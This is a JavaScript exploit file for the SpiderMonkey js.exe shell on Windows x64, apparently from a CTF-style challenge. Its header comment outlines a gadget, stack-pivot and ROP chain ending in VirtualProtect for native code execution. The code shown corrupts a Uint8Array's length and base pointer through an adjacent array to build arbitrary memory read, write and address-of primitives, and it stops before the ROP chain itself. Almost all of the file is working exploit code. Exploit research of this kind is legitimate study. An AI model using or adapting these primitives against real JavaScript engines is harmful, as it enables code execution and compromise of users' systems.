// Axel '0vercl0k' Souchet - 30 September 2018
//
// Exploit for js.exe on Windows x64. Redirect control flow
// to a first gadget that prepares a bit the context as well as
// giving the possibility to redirect control flow on a second gadget
// that pivots the stack into the inline buffer of an Uint8Array object.
// From there, thanks to a small ROP chain I finally pivot the stack in a region
// I can have infinite space.
// The final payload calls VirtualProtect and sets +x on the region which finally
// gives us arbitrary native code execution.
//

const Debug = false;
const dbg = function (p) {
    if(Debug == false) {
        return;
    }

    console.log('Debug: ' + p);
};

const Smalls = new Array(1, 2, 3, 4);
const U8A = new Uint8Array(8);

Smalls.blaze();

load('utils.js');
load('int64.js');

//
// Tamper the U8A's byteLength field via Smalls.
//

Smalls[11] = 0x100;

class __Pwn {
    constructor() {
        this.SavedBase = Smalls[13];
    }

    __Access(Addr, LengthOrValues) {
        if(typeof Addr == 'string') {
            Addr = new Int64(Addr);
        }

        const IsRead = typeof LengthOrValues == 'number';
        let Length = LengthOrValues;
        if(!IsRead) {
            Length = LengthOrValues.length;
        }

        if(IsRead) {
            dbg('Read(' + Addr.toString(16) + ', ' + Length + ')');
        } else {
            dbg('Write(' + Addr.toString(16) + ', ' + Length + ')');
        }

        //
        // Fix U8A's byteLength.
        //

        Smalls[11] = Length;

        //
        // Verify that we properly corrupted the length of U8A.
        //

        if(U8A.byteLength != Length) {
            throw "Error: The Uint8Array's length doesn't check out";
        }

        //
        // Fix U8A's base address.
        //

        Smalls[13] = Addr.asDouble();

        if(IsRead) {
            return U8A.slice(0, Length);
        }

        U8A.set(LengthOrValues);
    }

    Read(Addr, Length) {
        return this.__Access(Addr, Length);
    }

    WritePtr(Addr, Value) {
        const Values = new Int64(Value);
        this.__Access(Addr, Values.bytes());
    }

    ReadPtr(Addr) {
        return new Int64(this.Read(Addr, 8));
    }

    AddrOf(Obj) {

        //
        // Fix U8A's byteLength and base.
        //

        Smalls[11] = 8;
        Smalls[13] = this.SavedBase;

        //
        // Smalls is contiguous with U8A. Go and write a jsvalue in its buffer,
        // and then read it out via U8A.
        //

        Smalls[14] = Obj;
        return Int64.fromJSValue(U8A.slice(0, 8));
    }
};

const Pwn = new __Pwn();

const U8AAddress = Pwn.AddrOf(U8A);
dbg('[+] U8A is @ ' + U8AAddress.toString(16));

console.log(Math.atan2(Smalls));
